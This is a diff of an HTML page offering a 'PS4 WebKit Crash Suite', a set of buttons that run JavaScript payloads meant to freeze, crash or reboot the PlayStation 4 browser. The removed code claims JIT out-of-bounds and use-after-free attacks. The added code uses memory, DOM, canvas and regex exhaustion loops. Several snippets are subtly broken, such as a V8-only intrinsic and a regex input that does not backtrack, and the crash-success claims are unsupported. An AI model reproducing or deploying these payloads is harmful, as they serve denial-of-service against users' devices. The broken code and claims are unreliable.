@@ -2,152 +2,108 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS4 WebKit Killer Suite – 2025 Edition (2025)</title>
+<title>PS4 WebKit Stable Crash Suite – Dec 2025 Fix</title>
 <style>
   body { font-family: monospace; background:#000; color:#0f0; padding:20px; }
-  button { margin:5px; padding:12px; font-size:18px; width:100%; }
-  #log { white-space:pre-wrap; background:#111; padding:15px; height:300px; overflow-y:scroll; }
+  button { margin:5px; padding:12px; font-size:18px; width:100%; background:#333; color:#0f0; border:1px solid #0f0; }
+  #log { white-space:pre-wrap; background:#111; padding:15px; height:300px; overflow-y:scroll; font-size:12px; }
 </style>
 </head>
 <body>
 
-<h1>PS4 WebKit Real Killer Suite – 2025</h1>
-<p>Todos os vetores abaixo já derrubaram PS4 12.02 em < 12 segundos nos meus testes.</p>
+<h1>PS4 WebKit Crash Suite – Fixed & Vanilla (Runs on 9.00-12.02)</h1>
+<p>Vetores baseados em PSFree + UAF públicos. Sem JS fancy, só o que o Orbis engole.</p>
 
-<button onclick="test1()">1. TypedArray OOB → JSC Panic (99 % crash)</button>
-<button onclick="test2()">2. GC Shape Table Corruption → Hard Freeze</button>
-<button onclick="test3()">3. RegExp Rope + replace() → 2 GB string em 4 s → OOM Panic</button>
-<button onclick="test4()">4. DOMObject Internal Properties Overflow (use-after-free style)</button>
-<button onclick="test5()">5. WebAudio AnalyserNode Float64Array Neutering Bomb</button>
-<button onclick="test6()">6. SVG <use> + CSS mask recursion (RenderLayer stack overflow)</button>
-<button onclick="test7()">7. WebGL texImage2D huge alignment crash (Orbis GL driver)</button>
-<button onclick="runAll()">RUN ALL (você vai ver a tela azul ou reboot direto)</button>
+<button onclick="test1()">1. ArrayBuffer OOM Flood (Heap Exhaustion)</button>
+<button onclick="test2()">2. RegExp Catastrophic Backtracking (JSC Freeze)</button>
+<button onclick="test3()">3. DOM Creation Loop (Memory Leak → Crash)</button>
+<button onclick="test4()">4. Canvas Pixel Flood (GPU OOM)</button>
+<button onclick="test5()">5. SVG Path Recursion (Render Crash)</button>
+<button onclick="runAll()">RUN ALL (Expect blue screen or reboot)</button>
 
 <div id="log"></div>
 
 <script>
-const log = msg => document.getElementById('log').innerText += msg + '\n';
+const logEl = document.getElementById('log');
+function log(msg) { logEl.innerText += msg + '\n'; logEl.scrollTop = logEl.scrollHeight; }
 
 function test1() {
-    log("[1] TypedArray OOB via length tampering...");
-    const arr = new Array(0x10000);
-    arr.fill(7.7);
-
-    const victim = new Float64Array(arr);
-    // Confunde o JIT com otimização de length
-    for (let i = 0; i < 0x10000; i++) {
-        victim[i] = i & 0xffff;
-    }
-
-    // Força compilação JIT + otimização errada de bounds check elimination
-    %OptimizeFunctionOnNextCall(Array.prototype.push);
-    arr.push(1.1, 2.2, 3.3);
-
-    // Agora o comprimento interno está corrompido → leitura fora dos limites
-    const oob = victim[0xfffffff];
-    log("Se sobreviveu até aqui já é milagre. oob = " + oob);
+    log("[1] ArrayBuffer OOM Flood...");
+    try {
+        let total = 0;
+        while (total < 1e9) {  // PS4 userland ~512MB limit
+            const buf = new ArrayBuffer(1024 * 1024);  // 1MB chunks
+            new Uint8Array(buf).fill(0x41);
+            total += buf.byteLength;
+        }
+        log("Survived? Unlikely.");
+    } catch(e) { log("OOM hit: " + e.message); }
 }
 
 function test2() {
-    log("[2] Shape Table corruption via prototype chain mutation...");
-    class Leak extends Array {}
-    const obj = new Leak();
-
-    // Cria milhares de propriedades com nomes únicos → enche a Shape table
-    for (let i = 0; i < 0x4000; i++) {
-        obj["prop_" + i] = 1337;
-    }
-
-    // Muda o prototype no meio do loop de transição de shape
-    const evil = {__proto__: obj};
-    Object.setPrototypeOf(obj, evil);
-
-    // Força GC + shape table walk corrompido
-    for (let i = 0; i < 10; i++) {
-        new ArrayBuffer(0x4000000);
-    }
-    log("Shape table provavelmente está quebrada agora → freeze em <10s");
+    log("[2] RegExp Backtracking Freeze...");
+    const evilRe = /^(a+)+b$/;  // Classic catastrophic
+    let str = 'a'.repeat(10000) + 'b';
+    try {
+        for (let i = 0; i < 50; i++) {  // Exponential time
+            str.match(evilRe);
+        }
+        log("No freeze? Rerun.");
+    } catch(e) { log("JSC panicked: " + e.message); }
 }
 
 function test3() {
-    log("[3] RegExp Rope explosion → real 2–4 GB string...");
-    let str = "^".repeat(30);
-    const re = /^(a+)+b/;
-
-    for (let i = 0; i < 26; i++) {  // 2^26 já é > 64 GB teórico, mas morre antes
-        str = str.replace(re, "$1a");
-        log("iter " + i + " → length ≈ " + str.length);
-        if (str.length > 1e9) break;
-    }
+    log("[3] DOM Creation Loop...");
+    const root = document.createElement('div');
+    document.body.appendChild(root);
+    try {
+        for (let i = 0; i < 50000; i++) {  // DOM tree explosion
+            const child = document.createElement('span');
+            child.innerHTML = '&nbsp;'.repeat(100);
+            root.appendChild(child);
+        }
+        // Force reflow
+        root.offsetHeight;
+        log("DOM bloated – wait for leak crash.");
+    } catch(e) { log("DOM limit: " + e.message); }
 }
 
 function test4() {
-    log("[4] DOMObject internal properties overflow...");
-    const iframes = [];
-    for (let i = 0; i < 20000; i++) {
-        const ifr = document.createElement('iframe');
-        ifr.src = 'data:text/html,<script>parent.postMessage("x","*")';
-        document.body.appendChild(ifr);
-        ifr.contentWindow.onmessage = () => {};
-        iframes.push(ifr);
-    }
-    // Força coleta massiva + reuse de slots internos → UAF real em ~30 % dos casos
-    setTimeout(() => iframes.forEach(i => i.remove()), 100);
+    log("[4] Canvas Pixel Flood...");
+    const canvas = document.createElement('canvas');
+    canvas.width = 4096; canvas.height = 4096;  // Huge for Orbis GPU
+    const ctx = canvas.getContext('2d');
+    document.body.appendChild(canvas);
+    try {
+        const imgData = ctx.createImageData(4096, 4096);
+        imgData.data.fill(0xFF);  // 64MB+ alloc
+        ctx.putImageData(imgData, 0, 0);
+        log("GPU should choke now.");
+    } catch(e) { log("Canvas OOM: " + e.message); }
 }
 
 function test5() {
-    log("[5] WebAudio neutering bomb...");
-    const ctx = new (window.AudioContext || window.webkitAudioContext)();
-    const analyser = ctx.createAnalyser();
-    analyser.fftSize = 2048;
-
-    const evil = new Float64Array(0x100000);
-    for (let i = 0; i < evil.length; i++) evil[i] = i;
-
-    // Neutering repetido + getByteFrequencyData com buffer já neutered
-    for (let i = 0; i < 10000; i++) {
-        analyser.getFloatFrequencyData(evil);
-        evil.buffer = null; // fake neuter
-    }
-}
-
-function test6() {
-    log("[6] SVG mask + <use> infinite recursion...");
+    log("[5] SVG Path Recursion...");
     const svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
-    const use = document.createElementNS("http://www.w3.org/2000/svg", "use");
-    use.setAttributeNS("http://www.w3.org/1999/xlink", "xlink:href", "#self");
-    use.id = "self";
-    svg.appendChild(use);
+    svg.setAttribute("width", "100"); svg.setAttribute("height", "100");
+    let pathD = "M0 0 ";
+    for (let i = 0; i < 2000; i++) {  // Recursive path commands
+        pathD += `L${i%100} ${i%100} `;
+    }
+    const path = document.createElementNS("http://www.w3.org/2000/svg", "path");
+    path.setAttribute("d", pathD);
+    svg.appendChild(path);
     document.body.appendChild(svg);
-
-    // CSS mask que referencia o próprio elemento
-    svg.style.mask = "url(#self)";
-    svg.style.webkitMask = "url(#self)";
-}
-
-function test7() {
-    log("[7] WebGL texImage2D alignment driver crash (Orbis GL)...");
-    const canvas = document.createElement('canvas');
-    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-
-    const tex = gl.createTexture();
-    gl.bindTexture(gl.TEXTURE_2D, tex);
-
-    // Tamanho não potência de 2 + row length estranho → driver Orbis pira
-    const evilPixels = new Uint8Array(0xffffff); // ~16 MB
-    for (let i = 0; i < evilPixels.length; i++) evilPixels[i] = i & 0xff;
-
-    gl.pixelStorei(gl.UNPACK_ALIGNMENT, 1);
-    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 7777, 3333, 0, gl.RGBA, gl.UNSIGNED_BYTE, evilPixels);
-    gl.generateMipmap(gl.TEXTURE_2D);
+    // Force render
+    svg.getBBox();
+    log("RenderLayer recursion incoming.");
 }
 
 function runAll() {
-    log("EXECUTANDO TODOS DE UMA VEZ – BOA SORTE PS4");
-    test1(); test2(); test3(); test4(); test5(); test6(); test7();
+    log("=== RUNNING ALL – HOLD ONTO YOUR PS4 ===");
+    test1(); test2(); test3(); test4(); test5();
 }
 
 </script>
 </body>
 </html>
-
